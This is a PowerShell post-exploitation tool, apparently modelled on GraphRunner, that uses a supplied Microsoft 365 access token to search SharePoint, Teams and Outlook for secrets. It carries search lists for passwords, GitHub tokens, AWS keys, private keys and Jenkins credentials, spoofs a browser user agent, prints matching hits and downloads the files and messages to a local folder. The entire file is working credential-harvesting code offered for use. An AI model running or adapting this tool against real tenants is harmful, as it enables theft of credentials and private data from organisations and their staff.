<#
"""Inspired""" by GrahpRunner (https://github.com/dafthack/GraphRunner)
#>

$banner = @'

                                                                                                             by g0ttfrid

      :::::::  :::::::::: :::::::::: :::   ::::::::   ::::::::               :::        ::::::::      :::     :::    ::: 
    :+:   :+: :+:        :+:      :+:+:  :+:    :+: :+:    :+:              :+:       :+:    :+:    :+:      :+:   :+:   
   +:+   +:+ +:+        +:+        +:+  +:+               +:+              +:+              +:+   +:+ +:+   +:+  +:+     
  +#+   +:+ :#::+::#   :#::+::#   +#+  +#+            +#++: +#++:++#++:++ +#+           +#++:   +#+  +:+   +#++:++       
 +#+   +#+ +#+        +#+        +#+  +#+               +#+              +#+              +#+ +#+#+#+#+#+ +#+  +#+       
#+#   #+# #+#        #+#        #+#  #+#    #+# #+#    #+#              #+#       #+#    #+#       #+#   #+#   #+#       
#######  ###        ###      ####### ########   ########               ########## ########        ###   ###    ###       

'@

$Edge = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19042'
$IE = 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko'

$searchDefault = @{
    "Password" = "Password\:"
    #"Generic Password" = "password OR pass OR senha"
    #"Creds" = "credentials OR credenciais"
    #"Git Tokens" = """ghp_"" OR ""gho_"" OR ""ghu_"" OR ""ghs_"" OR ""ghr_"""
    #"AWS" = "AWS_ACCESS_KEY_ID OR AWS_SECRET_ACCESS_KEY OR (secret AND aws)"
    #"Private Keys" = """BEGIN RSA PRIVATE KEY"" OR ""BEGIN DSA PRIVATE KEY"" OR ""BEGIN EC PRIVATE KEY"""
    #"Postman" = "PMAK\-"
    #"Terraform" = "typeform"
    }

$searchOnlySharepoint = @{
    #"POC" = "(filetype:docx OR filetype:xlsx) AND ('ghp_' OR 'jenkins')"
    #"Git File Credentials" = "filetype:.git-credentials"
    #"Jenkins" = "filename:credentials.xml OR filename:jenkins.plugins.publish_over_ssh.BapSshPublisherPlugin.xml"
    #"IAAS" = "(filetype:tf OR filetype:tfstate OR filetype:tfstate.backup OR filetype:tfplan OR filetype:yaml OR filetype:jinja OR filetype:yml OR filetype:pp OR filetype:bicep OR filetype:hot)"
}

function DecodeJwtPayload {
    param([string]$Jwt)

    try {
        $payload = $Jwt.Split(".")[1]

        $remainder = $payload.Length % 4
        if ($remainder -gt 0) {
            $payload += "=" * (4 - $remainder)
        }
        $payload = $payload.Replace("-", "+").Replace("_", "/")
        $bytes = [System.Convert]::FromBase64String($payload)
        $json = [System.Text.Encoding]::UTF8.GetString($bytes)
        return ($json | ConvertFrom-Json)
    }
    catch {
        throw "Decode JWT failed: $($_.Exception.Message)"
    }
}

function CheckToken {
    param (
        [Parameter(Mandatory = $true)]
        [string]$AccessToken,

        [Parameter(Mandatory = $false)]
        [string[]]$Audience = @(),

        [Parameter(Mandatory = $false)]
        [string[]]$RequiredScopes = @()
    )

    $jwtPayload = DecodeJwtPayload -Jwt $AccessToken

    # exp
    $exp = ([DateTimeOffset]::FromUnixTimeSeconds($jwtPayload.exp)).LocalDateTime
    if ($exp -lt (Get-Date)) {
        Write-Error "- Expired token $exp"
        return $false
    }

    # aud
    if ($Audience) {
        $missing = $Audience | Where-Object {$_ -notin $jwtPayload.aud.TrimEnd('/')}
        if ($missing.Count -eq $Audience.Count) {
            Write-Error "- Invalid token for: $($Audience)"
            return $false
        }
    }

    # scp
    $tokenScopes = @()
    if ($jwtPayload.scp) {
        $tokenScopes = $jwtPayload.scp -split " "
    }
    elseif ($jwtPayload.roles) {
        # Token de application (client_credentials)
        $tokenScopes = $jwtPayload.roles
    }

    if ($RequiredScopes) {
        $missing = $RequiredScopes | Where-Object {$_ -notin $tokenScopes}
        if ($missing.Count -eq $RequiredScopes.Count) {
            Write-Error "- Token does not contain required scopes: $($RequiredScopes -join ', ')"
            return $false
        }
    }
    return $true
}

function Invoke-SharePointLeaks {
    param (
        [Parameter(Mandatory = $false)]
        [string]$AccessToken
    )

    Write-host -ForegroundColor Red $banner
    Write-Host "[ SharePoint ]"

    if (-not $AccessToken) {
        $AccessToken = Read-Host "Access Token to graph.microsoft.com"

        if (-not $AccessToken) {
            Write-Error "No token was provided. Aborting execution."
            return
        }
    }

    if (-not (CheckToken -AccessToken $AccessToken `
        -Audience @("https://graph.microsoft.com", "00000003-0000-0000-c000-000000000000") `
        #-RequiredScopes @("Files.Read.All", "Sites.Read.All") 
        )) {
        return
    }

    $uri = "https://graph.microsoft.com/v1.0/search/query"

    $headers = @{
            "Authorization" = "Bearer $AccessToken"
            "Content-Type"  = "application/json"
            "User-Agent" = $Edge
    }

    $merged = @{}
    $searchDefault.GetEnumerator() | ForEach-Object { $merged[$_.Key] = $_.Value }
    $searchOnlySharepoint.GetEnumerator() | ForEach-Object { $merged[$_.Key] = $_.Value }

    foreach ($entry in $merged.GetEnumerator()) {
        $body = @{
            requests = @(
                @{
                    entityTypes = @("driveItem")
                    query       = @{ queryString = $entry.Value }
                    from        = 0
                    size        = 25
                }
            )
        } | ConvertTo-Json -Depth 10 -Compress

        try {
            Start-Sleep -Seconds 3
            #[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
            #[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
            #$proxy = "http://127.0.0.1:8080"
            $response = Invoke-RestMethod -Uri $uri -Headers $headers -Method POST -Body $body
        }
        catch {
            Write-Warning $_.Exception.Message
            return
        }

        $hitsContainer = $response.value[0].hitsContainers
        $totalHits = $hitsContainer.total

        Write-Host "[ Search: $($entry.Key) ] [ Total itens: $($totalHits) ]"

        foreach ($hit in $hitsContainer.hits) {
            $item = $hit.resource
            Write-Host ("-" * 80)
            Write-Host "Item $($hit.rank)"
            Write-Host "File Name: $($item.name)"
            Write-Host "Create in: $($item.createdDateTime) by $($item.createdBy.user.displayName)"
            Write-Host "Last Modified: $($item.lastModifiedDateTime) by $($item.lastModifiedBy.user.displayName)"
            Write-Host "URL: $($item.webUrl)"
            Write-Host "DriveId + ItemId: $($item.parentReference.driveId):$($item.id)"
            Write-Host "Preview: $(($hit.summary -replace '<[^>]+>', ''))"
            Write-Host ("-" * 80)
        }
        Write-Host "`n"
    }

    if ($totalHits -gt 0) {
        while ($true) {
            $downloadChoice = Read-Host "Do you want to download a file? (y/n)"
            if ($downloadChoice -eq "y" -or $downloadChoice -eq "yes") {
                $ids = Read-Host "Input DriveId:ItemId"

                $id = $ids.split(":")

                $fileName = "$($id[1]).file"
                try {
                    $metaUrl = "https://graph.microsoft.com/v1.0/drives/$($id[0])/items/$($id[1])"
                    $meta = Invoke-RestMethod -Uri $metaUrl -Headers $headers -Method GET
                    if ($meta.name) { $fileName = $meta.name }
                } catch { }

                $localFolder = Join-Path $PWD "DownloadsOfficeLeak"
                if (-not (Test-Path $localFolder)) {
                    New-Item -ItemType Directory -Path $localFolder | Out-Null
                }

                $localPath = Join-Path $localFolder $fileName

                $downloadUrl = "https://graph.microsoft.com/v1.0/drives/$($id[0])/items/$($id[1])/content"

                try {
                    Invoke-RestMethod -Uri $downloadUrl -Headers $headers -OutFile $localPath

                    Write-Host "File saved in: $localPath" -ForegroundColor Green
                }
                catch {
                    Write-Warning $_.Exception.Message
                    continue
                }
                
            }
            elseif ($downloadChoice -eq "n" -or $downloadChoice -eq "no") {
                break
            }
            else {
                Write-Host "Invalid option, answer only 'y' or 'n'" -ForegroundColor Red
            }
        }
    }
}

function Invoke-TeamsLeaks {
    param (
        [Parameter(Mandatory = $false)]
        [string]$AccessToken
    )

    Write-host -ForegroundColor Red $banner
    Write-Host "[ Teams ]"

    if (-not $AccessToken) {
        $AccessToken = Read-Host "Access Token to substrate.office.com"

        if (-not $AccessToken) {
            Write-Error "No token was provided. Aborting execution."
            return
        }
    }

    if (-not (CheckToken -AccessToken $AccessToken -Audience @("https://substrate.office.com"))) {
        return
    }

    $uri = "https://substrate.office.com/search/api/v2/query"

    $headers = @{
        "Authorization" = "Bearer $AccessToken"
        "Content-Type"  = "application/json"
        "User-Agent" = $Edge
    }

    foreach ($entry in $searchDefault.GetEnumerator()) {
        $body = @{
            "EntityRequests" = @(
                @{
                    "entityType" = "Message"
                    "contentSources" = @("Teams")
                    "fields" = @(
                        "Extension_SkypeSpaces_ConversationPost_Extension_FromSkypeInternalId_String",
                        "Extension_SkypeSpaces_ConversationPost_Extension_FileData_String",
                        "Extension_SkypeSpaces_ConversationPost_Extension_ThreadType_String",
                        "Extension_SkypeSpaces_ConversationPost_Extension_SkypeGroupId_String",
                        "Extension_SkypeSpaces_ConversationPost_Extension_SenderTenantId_String"
                    )
                    "propertySet" = "Optimized"
                    "query" = @{
                        "queryString" = "$($entry.Value) AND NOT (isClientSoftDeleted:TRUE)"
                        "displayQueryString" = "$($entry.Value)"
                    }
                    "size" = 50
                    "topResultsCount" = 0
                }
            )
            "QueryAlterationOptions" = @{
                "EnableAlteration" = $true
                "EnableSuggestion" = $true
                "SupportedRecourseDisplayTypes" = @("Suggestion", "ServiceSideRecourseLink")
            }
            "cvid" = (New-Guid).ToString()
            "logicalId" = (New-Guid).ToString()
            "scenario" = @{
                "Dimensions" = @(
                    @{
                        "DimensionName" = "QueryType"
                        "DimensionValue" = "All"
                    },
                    @{
                        "DimensionName" = "FormFactor"
                        "DimensionValue" = "general.web.reactSearch"
                    }
                )
                "Name" = "powerbar"
            }
            "WholePageRankingOptions" = @{
                "EntityResultTypeRankingOptions" = @(
                    @{
                        "MaxEntitySetCount" = 1
                        "ResultType" = "Answer"
                    }
                )
                "EnableEnrichedRanking" = $true
                "EnableLayoutHints" = $true
                "SupportedSerpRegions" = @("MainLine")
                "SupportedRankingVersion" = "V3"
            }
            "Context" = @{
                "EntityContext" = @(
                    @{
                        "@odata.type" = "Microsoft.OutlookServices.Message"
                        "Id" = ""
                        "ClientThreadId" = ""
                    }
                )
            }
        }

        $bodyJson = $body | ConvertTo-Json -Depth 10

        try {
            Start-Sleep -Seconds 3
            #[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
            #[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
            #$proxy = "http://127.0.0.1:8080"
            $res = Invoke-RestMethod -Uri $uri -Method Post -Headers $headers -Body $bodyJson
        }
        catch {
            Write-Warning $_.Exception.Message
            return
        }

        Write-Host "[ Search: $($entry.Key) ] [ Total itens: $($res.EntitySets.ResultSets.Total) ]"

        foreach ($result in $res.EntitySets.ResultSets.Results) {
            Write-Host ("-" * 80)
            Write-Host "Item $($result.rank)"
            Write-Host "From: $($result.Source.From.EmailAddress.address)"
            Write-Host "Display to: $($result.Source.DisplayTo)"
            Write-Host "Date: $($result.Source.DateTimeSent)"
            Write-Host "ItemRestId: $($result.Source.ItemRestId)"
            Write-Host "Preview: $($result.HitHighlightedSummary)"
            Write-Host ("-" * 80)
        }
    }

    Write-Host ("-" * 80)
    Write-host "If you want to view the full body of the message, run the following command changing the variables." -ForegroundColor Cyan
    Write-host @'
PS > $res = (irm -Uri "https://graph.microsoft.com/v1.0/me/messages/$ItemRestId" -Headers @{Authorization = "Bearer $AcessToken"}).body.content -replace '<[^>]+>', '';[System.Web.HttpUtility]::HtmlDecode($res)
'@
    Write-Host ("-" * 80)
}

function Invoke-OutlookLeaks {
    param (
        [Parameter(Mandatory = $false)]
        [string]$AccessToken
    )

    Write-host -ForegroundColor Red $banner
    Write-Host "[ Outlook ]"

    if (-not $AccessToken) {
        $AccessToken = Read-Host "Access Token to graph.microsoft.com"

        if (-not $AccessToken) {
            Write-Error "No token was provided. Aborting execution."
            return
        }
    }

    if (-not (CheckToken -AccessToken $AccessToken `
        -Audience @("https://graph.microsoft.com", "00000003-0000-0000-c000-000000000000") `
        )) {
        return
    }

    $uri = "https://graph.microsoft.com/v1.0/search/query"

    $headers = @{
        "Authorization" = "Bearer $AccessToken"
        "Content-Type"  = "application/json"
        "User-Agent" = $Edge
    }

    foreach ($entry in $searchDefault.GetEnumerator()) {
        $body = @{ requests = @( @{
            entityTypes = @("message")
            query = @{
                queryString = $entry.Value
            }
            from = 0
            size = 25
            enableTopResults = $false
            }
        )
        } | ConvertTo-Json -Depth 10

        try {
            #Start-Sleep -Seconds 3
            #[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
            #[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
            #$proxy = "http://127.0.0.1:8080"
            $response = Invoke-RestMethod -Uri $uri -Headers $headers -Method POST -Body $body
        }
        catch {
            Write-Warning $_.Exception.Message
            return
        }

        $total = $response.value[0].hitsContainers[0].total
        
        Write-Host "[ Search: $($entry.Key) ] [ Total itens: $($total)]"

        #$moreresults = $response.value[0].hitsContainers[0].moreResultsAvailable

        foreach ($hit in $response.value[0].hitsContainers[0].hits) {
            Write-Host ("-" * 80)
            Write-Host "hitId: $($hit.hitId)"
            Write-Host "Subject: $($hit.resource.subject)"
            Write-Host "Sender: $($hit.resource.sender.emailAddress.name) ($($hit.resource.sender.emailAddress.address))"
            Write-Host "Receivers: $($hit.resource.replyTo | ForEach-Object { $_.emailAddress.Name })"
            Write-Host "Date: $($hit.resource.sentDateTime)"
            Write-Host "Preview: $($hit.resource.bodyPreview)"
            Write-Host ("-" * 80)
        }

        <#$response.value[0].hitsContainers[0].hits | ForEach-Object {
            $summary = $_.summary
            
            if ($summary -match $entry.Value) {
                Write-Host ("-" * 80)
                Write-Host "Subject: $($_.resource.subject)"
                Write-Host "Sender: $($_.resource.sender.emailAddress.address)"
                Write-Host "Receivers: $($_.resource.replyTo | ForEach-Object { $_.emailAddress.Name })"
                Write-Host "Date: $($_.resource.sentDateTime)"
                Write-Host "Summary:" $summary
                Write-Host ("-" * 80)
            }
        }#>

        if ($total -gt 0) {
            while ($true) {
                $downloadChoice = Read-Host "Do you want to download a file? (y/n)"
                if ($downloadChoice -eq "y" -or $downloadChoice -eq "yes") {
                    $hitId = Read-Host "Input hitId"

                    $localFolder = Join-Path $PWD "DownloadsOfficeLeak"
                    if (-not (Test-Path $localFolder)) {
                        New-Item -ItemType Directory -Path $localFolder | Out-Null
                    }

                    $filePath = Join-Path $localFolder "$($hit.resource.subject).html"
                    
                    $downloadUrl = "https://graph.microsoft.com/v1.0/me/messages/$($hitId)/\$value"

                    try {
                        #[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
                        #[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
                        #$proxy = "http://127.0.0.1:8080"
                        $messageDetails = Invoke-RestMethod -Uri $downloadUrl -Headers $headers
                        $messageDetails.body.content | Out-File -FilePath $filePath -Encoding utf8

                        Write-Host "File saved in: $($filePath)" -ForegroundColor Green
                    }
                    catch {
                        Write-Warning $_.Exception.Message
                        break
                    }
                }
                elseif ($downloadChoice -eq "n" -or $downloadChoice -eq "no") {
                    break
                }
                else {
                    Write-Host "Invalid option, answer only 'y' or 'n'" -ForegroundColor Red
                }
            }
        }
    }
}
